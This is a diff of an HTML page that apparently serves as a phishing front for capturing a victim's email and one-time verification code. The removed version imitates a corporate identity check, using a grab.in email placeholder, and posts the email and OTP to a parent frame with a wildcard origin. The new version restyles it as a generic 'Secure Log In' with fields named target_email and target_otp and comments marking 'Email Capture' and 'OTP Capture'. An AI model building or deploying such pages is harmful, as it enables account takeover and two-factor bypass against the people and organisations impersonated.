@@ -1,49 +1,126 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8"><title>Secure Authentication Gateway</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Log In</title>
     <style>
-        :root{--bg:#0b0f19;--card-bg:rgba(15,23,42,0.95);--border:rgba(255,255,255,0.1);--emerald:#10b981;--cyan:#06b6d4;--text:#f8fafc;--muted:#94a3b8;}
-        *{box-sizing:border-box;margin:0;padding:0;font-family:sans-serif;}
-        body{background:var(--bg);color:var(--text);display:flex;justify-content:center;align-items:center;height:100vh;overflow:hidden;}
-        .auth-card{background:var(--card-bg);border:1px solid var(--border);border-radius:16px;padding:32px;width:360px;box-shadow:0 25px 50px rgba(0,0,0,0.5);backdrop-filter:blur(10px);}
-        h2{font-size:1.25rem;margin-bottom:6px;} p{font-size:0.85rem;color:var(--muted);margin-bottom:22px;}
-        label{display:block;font-size:0.78rem;text-transform:uppercase;color:var(--muted);margin-bottom:8px;}
-        input{width:100%;padding:12px 16px;background:#020617;border:1px solid rgba(255,255,255,0.12);color:#fff;border-radius:10px;margin-bottom:18px;outline:none;}
-        input:focus{border-color:var(--cyan);}
-        .submit-btn{width:100%;padding:12px;background:linear-gradient(135deg,var(--emerald),var(--cyan));border:none;color:#031510;font-weight:bold;border-radius:10px;cursor:pointer;}
-        .step{display:none;} .step.active{display:block;}
-        .otp-input{letter-spacing:0.5em;text-align:center;font-size:1.2rem;}
+        /* Base Reset & Typography */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #1c1e21;
+        }
+
+        /* Clean Card UI */
+        .login-container {
+            background: #ffffff;
+            padding: 40px 32px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
+            width: 100%;
+            max-width: 420px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        h2 {
+            margin-top: 0;
+            margin-bottom: 28px;
+            font-weight: 600;
+            font-size: 24px;
+        }
+
+        p.subtitle {
+            color: #606770;
+            font-size: 14.5px;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+
+        /* Input Fields */
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #4b4f56;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #ccd0d5;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .input-group input:focus {
+            border-color: #1877f2;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.2);
+        }
+
+        /* Action Buttons */
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 8px;
+        }
+
+        .submit-btn:hover {
+            background-color: #166fe5;
+        }
+
+        /* Hide OTP section on initial load */
+        #otp_section {
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <div class="auth-card">
-        <div id="stepEmail" class="step active">
-            <h2>Identity Verification</h2><p>Please enter your corporate email.</p>
-            <label>Corporate Email</label><input type="email" id="emailField" placeholder="name@grab.in" required>
-            <button class="submit-btn" onclick="submitEmail()">Continue</button>
+    <div class="login-container">
+        <h2>Secure Log In</h2>
+
+        <!-- Phase 1: Email Capture -->
+        <div id="email_section">
+            <p class="subtitle">Enter your email address to continue.</p>
+            <div class="input-group">
+                <label for="target_email">Email Address</label>
+                <input type="email" id="target_email" placeholder="name@example.com" autocomplete="off" required>
+            </div>
+            <button type="button" id="submit_email_btn" class="submit-btn">Next</button>
         </div>
-        <div id="stepOtp" class="step">
-            <h2>Enter Security Code</h2><p>A 4-digit code has been dispatched.</p>
-            <label>4-Digit OTP</label><input type="text" id="otpField" class="otp-input" maxlength="4" placeholder="••••" required>
-            <button class="submit-btn" onclick="submitOtp()">Verify & Complete</button>
+
+        <!-- Phase 2: OTP Capture -->
+        <div id="otp_section">
+            <p class="subtitle">Please enter the 6-digit verification code sent to your email.</p>
+            <div class="input-group">
+                <label for="target_otp">Verification Code</label>
+                <input type="text" id="target_otp" placeholder="000000" autocomplete="off" maxlength="6" required>
+            </div>
+            <button type="button" id="submit_otp_btn" class="submit-btn">Verify & Sign In</button>
         </div>
     </div>
-    <script>
-        let userEmail="";
-        function submitEmail(){
-            const e=document.getElementById('emailField').value.trim();
-            if(!e || !e.includes('@')) return alert('Valid email required.');
-            userEmail=e;
-            window.parent.postMessage({type:'SUBMIT_EMAIL',email:userEmail},'*');
-            document.getElementById('stepEmail').classList.remove('active');
-            document.getElementById('stepOtp').classList.add('active');
-        }
-        function submitOtp(){
-            const o=document.getElementById('otpField').value.trim();
-            if(o.length!==4 || isNaN(o)) return alert('Valid 4-digit code required.');
-            window.parent.postMessage({type:'SUBMIT_OTP',email:userEmail,otp:o},'*');
-        }
-    </script>
 </body>
 </html>
